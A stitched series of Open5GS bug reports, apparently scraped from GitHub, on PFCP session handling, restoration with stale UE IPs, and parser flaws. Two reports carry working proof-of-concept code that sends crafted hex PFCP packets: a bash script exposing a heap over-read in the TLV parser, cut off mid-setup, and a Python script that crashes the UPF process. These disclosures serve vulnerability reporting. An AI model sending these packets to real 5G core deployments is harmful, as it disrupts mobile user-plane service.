### Open5GS Release, Revision, or Tag

v2.8.1

### Steps to reproduce

This is the counterpart of ticket #4860 but applied to open5gs-upfd instead of open5gs-smfd.

Apparently open5gs-upfd is not currently deleting session when the SMF is considered in failure (due to eg. Heartbeat timeout).

How to reproduce: Create some sessions on the UPF, then eg. kill the open5gs-smfd process, let UPF send Heartbeats until t3_holding_duration triggers.

### Logs

```shell

```

### Expected behaviour

As per TS 23.527 V18.6.0 clause 4.4.3.1:
> the UPF shall delete all the session contexts affected by the peer PFCP entity failure that it may have stored.

### Observed Behaviour

No session is deleted then according to open5gs-upfd logs.

This is well described by @MrBrownieCGN in https://github.com/open5gs/open5gs/issues/4860#issuecomment-6202375701 point 5:

> 5. UPF side (re "this same issue also probably affects open5gs-upfd")
> 
> On main, when the UPF loses the heartbeat towards the SMF it only goes back to will_associate and keeps all
> sessions (src/upf/pfcp-sm.c:342-345); sessions of that SMF are removed only when the SMF comes back with a new
> Recovery Time Stamp (pfcp_restoration(), :371-386). Here the spec is not implementation specific. TS 23.527 V18.6.0,
> clause 4.4.3.1:
> 
> >    When a UPF detects that a peer PFCP entity in the SMF is not reachable for a preconfigured time, and the MPAS or SSET
> >    procedure specified for SMF set in clause 5.22 of 3GPP TS 29.244 [4]) are not used, the UPF shall delete all the
>>     session contexts affected by the peer PFCP entity failure that it may have stored.
> 
> The "preconfigured time" can reasonably be longer than the heartbeat give-up, but some bound seems to be required.
>


### Expected behaviour

As of current main  (d5d735c67356ff4cb2d86be6effadcc351b5b7b5), open5gs-smfd doesn't release UE sessions after the only UPF available is considered to be unavailable after obtaining no answer for a while (eg. multiple Heartbeat Requests not answered).

With current implementation, open5gs-smfd will keep trying forever until the UPF is available again and it sends a newer (bigger) Recovery timestamp which starts restoration value. 

The problem with that is that it may take a long time, or even "forever", for the UPF to become available again, and during that potentially long time the Control Plane assumes the user plane is working just fine, because the sessions are still active, which is false. This means for instance time accounting may go on on the OCS, etc.

Instead, when a Heartbeat timeout happens (configurable by the user, eg. 60 seconds) and the UPF is considered unavailable, it should release all the sessions on the core network so that the subscriber can see it has no PDU session instead of simply seeing no traffic passing through.

What do the specs say about this scenario? Well, they basically say it's "implementation specific".

3GPP TS 29.244 5.8.2 Behaviour with an Established PFCP Association
> When a PFCP Association is established with a UP function, the CP function:
> ...
> - shall check the responsiveness of the UP function using the Heartbeat procedure as specified in clause 6.2.2;

3GPP TS 23.527 4.2 N4 Failure and Restart Detection:
> Across PFCP based interfaces, an SMF and UPF shall utilize the PFCP Heartbeat Request and Heartbeat Response
> messages to detect a peer PFCP entity failure or restart as described in clause 19A of 3GPP TS 23.007

3GPP TS 23.527 4.5 N4 path failure:
> If the N4 path to the UPF is down, the SMF should handle this as an UPF Failure without Restart, see clause 4.3.3.

4.3.3 Restoration Procedure for PSA UPF Failure without Restart
> Procedures for PSA UPF failure without restart are implementation specific.

### Observed Behaviour

See "Expected behaviour" section.

items.body:
### Open5GS Release, Revision, or Tag

v2.8.1 (also observed on main `d6f1ed8`, 2026-10-19)

### Summary

After `docker restart upf` (i.e. UPF process restarts and loses its PFCP state), the SMF's PFCP
**restoration** re-installs the sessions **it holds in memory** — including the UE IPv4 address it
recorded at session creation. If the UE has meanwhile re-registered and received a **new IP**, the
restored downlink PDRs are keyed on the **old** IP, and every downlink packet for the UE's real IP
misses the PDR and is silently black-holed.

On a userspace datapath (eUPF) the effect is a silent drop with **no error log and no drop counter**:
the packet falls through to `XDP_PASS`, hits the kernel, and is discarded as a martian source
(source address does not match the outgoing interface).

### Steps to reproduce (5GC, single UPF, no MPAS)

1. Establish N PDU sessions for N UEs (we use 8 sessions / 4 UEs over a real NG interface:
   UERANSIM gNB+UE, eUPF as UPF, open5gs SMF/AMF/… on the same host).
2. `docker stop upf` → wait for heartbeat give-up → SMF releases all sessions (#4863 path) →
   `docker start upf`.
   *Alternatively* the mismatch also appears when the UE re-registers between the two events.
3. Let the UEs re-register (they get **new** IPs; in our run `10.64.0.2/.3` instead of `10.64.0.64/.65`).
4. Observe: the SMF's restoration re-creates the PFCP sessions, but with the **old** UE IPs.

### Observed behaviour

In the UPF's downlink PDR table (`pdr_map_downlink_ip4` in eUPF; the F-TEID/UE-IP → PDR map):
keys are `10.64.0.64`, `10.64.0.65`, while the UEs' actual tun addresses are `10.64.0.2`, `10.64.0.3`.

eUPF's REST API confirms it received the stale addresses:

```
SEID 4  PDR1 Ipv4 = 10.65.0.65   (while the UE's tun is 10.65.0.2)
```

Download traffic for the real IP then produces (measured, 20 pings from an IMS container):

```
rx_n6  +31     tx_n3  +0       XDP_PASS +46
```

i.e. **the packet never reaches the GTP encapsulation step** — it is passed to the kernel.
Contrast with a UE whose IP did match (same run, same UPF):

```
rx_n6  +38     tx_n3  +20      XDP_REDIRECT +20
```

The whole test took 2 minutes to confirm: a full cold start (`amf+smf → upf → gNB → UE`) makes the
two sides agree again (8 ↔ 8), and every path recovers (ICMP both ways, and `SIP OPTIONS` to the
P-CSCF returns `200 OK`).

### Expected behaviour

Restoration should not resurrect stale UE addressing. Two possible shapes:

1. **Validate on restore**: when re-installing a session, if the UPF-side session state is gone
   (which the SMF can tell from the new Recovery Time Stamp / the fact it is running `pfcp_restoration()`),
   don't blindly re-install the old F-TEID/UE-IP pairs — either refresh them from the current
   SM context or release the session so the UE re-establishes cleanly.
2. **Release instead of restore** when the UPF lost state: this is exactly the "release vs restore"
   decision discussed in #4860 / #4876. If the operator chooses `keep`, the restoration path still
   has to guarantee that the addressing it pushes matches what the UE currently uses.

### Why this matters beyond our rig

* This is the **user-visible failure mode** of the restore/release race in #4860: the control plane
  (and charging) believes the session is alive while the user plane silently drops **all** downlink
  traffic. There is no alarm surface for it.
* It only affects *some* UEs (the ones whose IP changed), so it looks like "random UEs are broken",
  which is very hard to triage — we initially mis-diagnosed it as a NIC/veth problem.
* With #4876 (`T_release_after_upf_failure`) landing, both branches (`release` and `keep`) need this
  invariant: **restoration must use the addressing that the UE actually has now**.

### Logs / evidence

Happy to attach: eUPF `pdr_map_downlink_ip4` dump (bpftool), the two XDP counter deltas above,
the eUPF restoration log line (`session UE 10.64.0.64 -> N3 endpoint …`), and the SMF window
showing the release + restoration. Full analysis and the local guard we added are in our repo;
can share on request.

### Our workaround

A consistency check between the UPF's session UE-IPs and the UEs' actual tunnel addresses, run after
any UPF restart (`session-ip-consistency.sh` in our tree), plus the rule "always do a full cold
start, never restart the UPF alone". Both are workarounds, not fixes.

### Open5GS Release, Revision, or Tag

v2.7.7 (commit c81b4f94f525c400adeb2155f1c8fdeabed87bae)

### Steps to reproduce

Run below script
```bash
#!/usr/bin/env bash
# Reproduction script for Open5GS PFCP TLV parser bug:
# `tlv_parse_leaf` accepts short fixed-width integer IEs.
#
# Two stages of evidence:
#   STAGE 1: live SGW-U daemon shows the parser accepts a malformed
#            1-byte Recovery Time Stamp (log identical to well-formed
#            length=4; length=5 control is correctly rejected).
#   STAGE 2: standalone ASAN harness links the same lib/core/ogs-tlv*.c
#            against a precisely-sized 5-byte heap buffer, triggering
#            heap-buffer-overflow at ogs-tlv-msg.c:551 — the read past
#            the IE boundary that the live daemon hides because
#            ogs_pfcp_recvfrom always allocates OGS_MAX_SDU_LEN bytes.
#
# Tested on Ubuntu 24.04. Total runtime: ~3 minutes from cached deps.

set -euo pipefail

WORK=/tmp/open5gs-tlv-repro
SRC=$WORK/open5gs
PFCP_ADDR=127.0.0.6
PFCP_PORT=8805
COMMIT=c81b4f94f525c400adeb2155f1c8fdeabed87bae  # v2.7.7

echo "=== 1/8 install build deps ==="
sudo apt-get update -qq
sudo apt-get install -y -qq \
  libtalloc-dev libsctp-dev libgnutls28-dev libgcrypt-dev libssl-dev \
  libidn11-dev libmongoc-dev libbson-dev libyaml-dev libnghttp2-dev \
  libmicrohttpd-dev libcurl4-gnutls-dev libtins-dev libusrsctp-dev \
  meson ninja-build gcc clang git python3 flex bison >/dev/null

echo "=== 2/8 clone Open5GS at $COMMIT ==="
mkdir -p "$WORK"
[ -d "$SRC/.git" ] || git clone -q https://github.com/open5gs/open5gs.git "$SRC"
git -C "$SRC" checkout -q "$COMMIT"
git -C "$SRC" log -1 --format='%H %s'

echo "=== 3/8 build sgwud ==="
[ -f "$SRC/build/build.ninja" ] || meson setup "$SRC/build" "$SRC" --buildtype=debug >/dev/null
ninja -C "$SRC/build" src/sgwu/open5gs-sgwud >/dev/null
echo "built: $SRC/build/src/sgwu/open5gs-sgwud"

echo "=== 4/8 write minimal SGW-U config ==="
cat > "$WORK/sgwu.yaml" <<EOF
logger:
  file:
    path: $WORK/sgwu.log
global:
  max:
    ue: 64
sgwu:
  pfcp:
    server:
      - address: $PFCP_ADDR
  gtpu:
    server:
      - address: $PFCP_ADDR
EOF

echo "=== 5/8 start sgwud, send three PFCP Heartbeat Request packets ==="
pkill -9 -f open5gs-sgwud 2>/dev/null || true; sleep 1
"$SRC/build/src/sgwu/open5gs-sgwud" -c "$WORK/sgwu.yaml" > "$WORK/sgwu.stdout" 2>&1 &
SGWU_PID=$!
trap "kill -9 $SGWU_PID 2>/dev/null || true" EXIT
sleep 1.5
kill -0 $SGWU_PID 2>/dev/null || { echo "FAIL: sgwud did not start"; tail "$WORK/sgwu.stdout"; exit 1; }
echo "sgwud listening on $PFCP_ADDR:$PFCP_PORT (PID $SGWU_PID)"

send_pkt() {
  echo "--- $1 ---"
  python3 -c "import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(bytes.fromhex('$2'), ('$PFCP_ADDR', $PFCP_PORT))"
  sleep 0.4
}

# A: malformed — Recovery Time Stamp length=1 (THE BUG)
send_pkt "A: malformed length=1" \
  "200100110000010000600001aa00c0000411223344"
# B: well-formed control — length=4
send_pkt "B: well-formed length=4" \
  "2001001400000200006000040102030400c0000411223344"
# C: overlong control — length=5 (parser correctly rejects)
send_pkt "C: overlong length=5" \
  "200100150000030000600005aabbccddee00c0000411223344"

# Graceful shutdown so the daemon flushes test C's parse-error lines to disk
kill -TERM $SGWU_PID 2>/dev/null || true
wait $SGWU_PID 2>/dev/null || true

echo ""
echo "=== 6/8 STAGE 1 result: filtered sgwud log ==="
grep -E "Cannot find PFCP-Node|Invalid TLV|parse_msg\(\) failed" "$WORK/sgwu.stdout" \
  | sed -E 's/\x1b\[[0-9;]*m//g'

A_PARSED=$(grep -c "Cannot find PFCP-Node: type \[1\]" "$WORK/sgwu.stdout" || true)
C_REJECTED=$(grep -c "Invalid TLV length 5" "$WORK/sgwu.stdout" || true)

echo ""
echo "=== 7/8 build standalone ASAN harness ==="
# Stub for Open5GS core types the TLV parser needs. Minimal surface only.
cat > "$WORK/ogs-core.h" <<'OGS_CORE_EOF'
#ifndef OGS_CORE_H
#define OGS_CORE_H
#define OGS_CORE_INSIDE 1
#include <arpa/inet.h>

#include <inttypes.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>

#include <string.h>

#define OGS_ERROR -1
#define OGS_LOG_ERROR 3
#define OGS_ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
#define ogs_min(a, b) ((a) < (b) ? (a) : (b))

#define ogs_likely(x) __builtin_expect(!!(x), 1)
#define ogs_unlikely(x) __builtin_expect(!!(x), 0)
#define ogs_assert(expr) do { if (!(expr)) { fprintf(stderr, "assert: %s:%d %s\n", __FILE__, __LINE__, #expr); abort(); } } while (0)
#define ogs_expect(expr) ogs_assert(expr)
#define ogs_assert_if_reached() do { fprintf(stderr, "unreachable: %s:%d\n", __FILE__, __LINE__); abort(); } while (0)
#define ogs_error(...) do { fprintf(stderr, "ERROR: "); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); } while (0)
#define ogs_warn(...) do { fprintf(stderr, "WARN: "); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); } while (0)
#define ogs_trace(...) do { } while (0)
#define ogs_fatal(...) do { fprintf(stderr, "FATAL: "); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); } while (0)
static inline void ogs_log_hexdump(int level, const void *data, size_t len) { (void)level; (void)data; (void)len; }
typedef struct ogs_pkbuf_s { uint8_t *head, *data, *tail, *end; unsigned int len; } ogs_pkbuf_t;
static inline ogs_pkbuf_t *ogs_pkbuf_alloc(void *pool, unsigned int size) {
    (void)pool; ogs_pkbuf_t *p = calloc(1, sizeof(*p)); ogs_assert(p);
    p->head = calloc(1, size ? size : 1); ogs_assert(p->head);
    p->data = p->tail = p->head; p->end = p->head + size; return p;
}
static inline void ogs_pkbuf_free(ogs_pkbuf_t *p) { if (!p) return; free(p->head); free(p); }
static inline int ogs_pkbuf_tailroom(const ogs_pkbuf_t *p) { return (int)(p->end - p->tail); }
static inline void ogs_pkbuf_reserve(ogs_pkbuf_t *p, int len) { p->data += len; p->tail += len; }
static inline void *ogs_pkbuf_put(ogs_pkbuf_t *p, unsigned int len) { void *t = p->tail; p->tail += len; p->len += len; return t; }

#define ogs_malloc(s) malloc((s))

#define ogs_pool_init(pool, size) do { (void)(pool); (void)(size); } while (0)
#define ogs_pool_final(pool) do { (void)(pool); } while (0)
#define ogs_pool_avail(pool) (1024U)
#define ogs_pool_alloc(pool, nodep) do { (void)(pool); *(nodep) = calloc(1, sizeof(**(nodep))); } while (0)
#define ogs_pool_free(pool, node) do { (void)(pool); free((node)); } while (0)
typedef struct ogs_core_stub_s { struct { int pool; } tlv; } ogs_core_stub_t;
static inline ogs_core_stub_t *ogs_core(void) { static ogs_core_stub_t c = { { 0 } }; return &c; }
typedef struct ogs_rbnode_s { struct ogs_rbnode_s *left, *right, *parent; } ogs_rbnode_t;
typedef struct ogs_rbtree_s { ogs_rbnode_t *root; } ogs_rbtree_t;
#define OGS_RBTREE(name) ogs_rbtree_t name = { NULL }
#define ogs_rb_entry(ptr, type, member) ((type *)((char *)(ptr) - offsetof(type, member)))
static inline void ogs_rbtree_link_node(ogs_rbnode_t *n, ogs_rbnode_t *p, ogs_rbnode_t **l) { n->parent = p; n->left = n->right = NULL; *l = n; }
static inline void ogs_rbtree_insert_color(ogs_rbtree_t *t, ogs_rbnode_t *n) { (void)t; (void)n; }
#include "ogs-tlv.h"
#include "ogs-tlv-msg.h"
#endif
OGS_CORE_EOF

# Harness driver: feed a 5-byte heap buffer with a length=1 Recovery
# Time Stamp IE (type 96 / OGS_TLV_UINT32). The parser reads bytes
# [0..3] past the declared 1-byte value; since the heap allocation
# is exactly 5 bytes, bytes [1..3] are past the allocation boundary.
cat > "$WORK/asan_harness.c" <<'HARNESS_EOF'
#include "ogs-core.h"
#define OGS_PFCP_RECOVERY_TIME_STAMP_TYPE 96
#define OGS_PFCP_SOURCE_IP_ADDRESS_TYPE 192
typedef struct {
    ogs_tlv_uint32_t recovery_time_stamp;
    ogs_tlv_octet_t source_ip_address;
} msg_t;
static ogs_tlv_desc_t desc_recovery = {
    OGS_TLV_UINT32, "Recovery Time Stamp",
    OGS_PFCP_RECOVERY_TIME_STAMP_TYPE, 4, 0, sizeof(ogs_tlv_uint32_t), { NULL } };
static ogs_tlv_desc_t desc_source = {
    OGS_TLV_VAR_STR, "Source IP Address",
    OGS_PFCP_SOURCE_IP_ADDRESS_TYPE, 0, 0, sizeof(ogs_tlv_octet_t), { NULL } };
static ogs_tlv_desc_t desc_msg = {
    OGS_TLV_MESSAGE, "PFCP Heartbeat-like", 0, 0, 0, 0,
    { &desc_recovery, &desc_source, NULL } };

static void parse_and_print(const char *label, const uint8_t *buf, size_t len) {
    msg_t msg;
    ogs_pkbuf_t pkbuf;
    memset(&msg, 0, sizeof(msg));
    memset(&pkbuf, 0, sizeof(pkbuf));
    pkbuf.data = (uint8_t *)buf;
    pkbuf.len = (unsigned int)len;
    int rv = ogs_tlv_parse_msg(&msg, &desc_msg, &pkbuf, OGS_TLV_MODE_T2_L2);
    printf("%-30s rv=%d  recovery.presence=%llu  recovery.u32=0x%08x  "
           "source.presence=%llu  source.len=%u\n",
        label, rv,
        (unsigned long long)msg.recovery_time_stamp.presence,
        msg.recovery_time_stamp.u32,
        (unsigned long long)msg.source_ip_address.presence,
        msg.source_ip_address.len);
}

int main(int argc, char **argv) {
    /* Valid: Recovery Time Stamp length=4 (positive control) */
    static const uint8_t valid_recovery[] = {
        0x00, 0x60, 0x00, 0x04, 0x01, 0x02, 0x03, 0x04 };
    /* THE BUG: length=1 Recovery Time Stamp followed by Source IP IE.
       Parser reads 4 bytes from the IE's value buffer, picking up
       the next IE's type/length header (00 c0 00) and producing
       recovery.u32 = 0xaa00c000. */
    static const uint8_t short_then_source[] = {
        0x00, 0x60, 0x00, 0x01, 0xaa,
        0x00, 0xc0, 0x00, 0x04, 0x11, 0x22, 0x33, 0x44 };
    /* Overlong length=5 (negative control: parser correctly rejects) */
    static const uint8_t overlong[] = {
        0x00, 0x60, 0x00, 0x05, 0x01, 0x02, 0x03, 0x04, 0x05 };
    /* Length=1 at end of allocation — triggers heap OOB read */
    static const uint8_t short_at_end[] = {
        0x00, 0x60, 0x00, 0x01, 0xaa };

    if (argc == 2 && strcmp(argv[1], "asan-tail") == 0) {
        uint8_t *heap = malloc(sizeof(short_at_end));
        ogs_assert(heap);
        memcpy(heap, short_at_end, sizeof(short_at_end));
        parse_and_print("short_recovery_at_end", heap, sizeof(short_at_end));
        free(heap);
        return 0;
    }

    parse_and_print("valid_recovery (len=4)",
        valid_recovery, sizeof(valid_recovery));
    parse_and_print("short_then_source (len=1)",
        short_then_source, sizeof(short_then_source));
    parse_and_print("overlong_recovery (len=5)",
        overlong, sizeof(overlong));
    return 0;
}
HARNESS_EOF

# Copy the four TLV source files into $WORK so the quoted include
# "ogs-core.h" resolves to our stub (next to the .c files), not the
# real ogs-core.h in lib/core/ which pulls in the full Open5GS tree.
cp "$SRC/lib/core/ogs-tlv.c"     "$WORK/"
cp "$SRC/lib/core/ogs-tlv.h"     "$WORK/"
cp "$SRC/lib/core/ogs-tlv-msg.c" "$WORK/"
```

items.body:
**Update (August 2026):**

The original description below reflects the initial analysis performed when reporting the issue. Subsequent debugging and discussion with the Open5GS maintainers showed that the crash originates from an error-path state leak during failed GTP-U peer setup rather than from the Session Deletion itself. The reduced reproducer and detailed root-cause analysis are provided in the comments below.

---

### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

Start Open5GS v2.7.7 normally, with the UPF PFCP interface reachable at `127.0.0.7:8805`.

Then run the following minimal Python reproducer from a host that can reach the UPF N4 interface:

```python
#!/usr/bin/env python3
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.7"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8805
LOCAL_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8806

messages = [
    (
        "assoc_setup",
        "2005001500cdd700003c0005007f00000700600004ee023068",
    ),
    (
        "session_estab_outer_header_creation_fields_1",
        "21320067000000000000000000cde000003c0005007f0000070039000d0200000000f000781e7f0000070001001f003800020001001d000400000064000200050014000100006c0004000000010003001a006c000400000001002c00020200000400080054000402000102",
    ),
    (
        "session_estab_outer_header_creation_fields_2",
        "21320067000000000000000000f0c200003c0005007f0000070039000d0200000000f000b4657f0000070001001f003800020001001d000400000064000200050014000100006c0004000000010003001a006c000400000001002c00020200000400080054000402000102",
    ),
    (
        "session_del",
        "2136000c00000000f000b46500f0c300",
    ),
]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(0.5)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    sock.bind(("", LOCAL_PORT))
except OSError as e:
    print(f"Could not bind local UDP port {LOCAL_PORT}: {e}")
    sys.exit(1)

for i, (name, hex_msg) in enumerate(messages, start=1):
    data = bytes.fromhex(hex_msg)
    print(f"[>] {i}/{len(messages)} {name} len={len(data)}")
    sock.sendto(data, (HOST, PORT))

    try:
        resp, _ = sock.recvfrom(65535)
        print(f"[<] response len={len(resp)}")
    except socket.timeout:
        print("[<] no response")

    time.sleep(0.05)

sock.close()
print("Done. Check whether open5gs-upfd is still running.")
```

Run:

```bash
python3 open5gs_upf_unknown_family_repro.py 127.0.0.7 8805 8806
```

After replaying the sequence, check the UPF process:

```bash
pgrep -af open5gs-upfd || echo "open5gs-upfd is down"
```



### Logs

```shell
Relevant UPF log excerpt during the replay:


[upf] INFO: PFCP associated [127.0.0.7]:8805 [127.0.0.1]:8806 (../src/upf/pfcp-sm.c:168)

[upf] INFO: [Added] Number of UPF-Sessions is now 1 (../src/upf/context.c:212)
[gtp] WARNING: gtp_connect() [::]:2152 failed (../lib/gtp/path.c:72)
[pfcp] ERROR: ogs_gtp_connect() failed (../lib/pfcp/context.c:1222)
[upf] FATAL: CHECK CONFIGURATION: upf.gtpu (../src/upf/n4-handler.c:141)
[upf] FATAL: ogs_pfcp_setup_far_gtpu_node() failed (../src/upf/n4-handler.c:142)
[upf] ERROR: ogs_pfcp_extract_node_id() failed type [51] pfcp_status [4] from [127.0.0.7]:8805 (../src/upf/pfcp-path.c:114)

[upf] INFO: [Added] Number of UPF-Sessions is now 2 (../src/upf/context.c:212)
[pfcp] FATAL: Unknown family(0) (../lib/pfcp/context.c:1744)
[core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

The UPF should reject malformed PFCP Session Establishment / Session Deletion input gracefully and return an appropriate PFCP error cause, or ignore the malformed message.

It should not call `ogs_fatal()` / `abort()` or terminate the `open5gs-upfd` process.


### Observed Behaviour

### Summary

The Open5GS UPF process crashes on `v2.7.7` after replaying a short stateful PFCP sequence involving repeated malformed `Outer Header Creation` fields.

The minimized reproducer contains four PFCP messages:

1. PFCP Association Setup Request
2. PFCP Session Establishment Request with malformed Outer Header Creation fields
3. PFCP Session Establishment Request with malformed Outer Header Creation fields
4. PFCP Session Deletion Request

The UPF terminates with:

```text
[pfcp] FATAL: Unknown family(0) (../lib/pfcp/context.c:1744)
[core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
```

### Reproducer characteristics

The minimal reproducer is the following four-message PFCP sequence:

```text
assoc_setup
session_estab_outer_header_creation_fields
session_estab_outer_header_creation_fields
session_del
```

Removing any one of these four messages prevents the crash in my tests. In particular, removing the final PFCP Session Deletion Request makes the UPF stay alive, so the reproducer should be considered a four-message stateful sequence, not a three-message one.

I also reproduced the same fatal signature when additional PFCP messages were present between the relevant steps. This suggests that the crash is related to persistent UPF/PFCP state across multiple messages, rather than a single isolated malformed packet.

The observed fatal signature is:

```text
Unknown family(0) (../lib/pfcp/context.c:1744)
```

### Relation to potential duplicates

GitHub suggested #4491 and #4423 as potential duplicates.

I do not think #4491 is the same issue because it concerns crafted GTP-U traffic on UDP/2152 and a SIGSEGV/exit 139 on the GTP-U receive datapath. This report is about PFCP/N4 traffic on UDP/8805 and terminates with:

```text
Unknown family(0) (../lib/pfcp/context.c:1744)
```

#4423 is related because it also involves UPF crashes around `OuterHeaderCreation`, but it describes a zero-length `OuterHeaderCreate` IE in a single PFCP Session Establishment Request. This reproducer is different: it uses a four-message stateful PFCP sequence, the OHC IE is not the zero-length case, and removing any one of the four messages prevents reproduction in my tests.
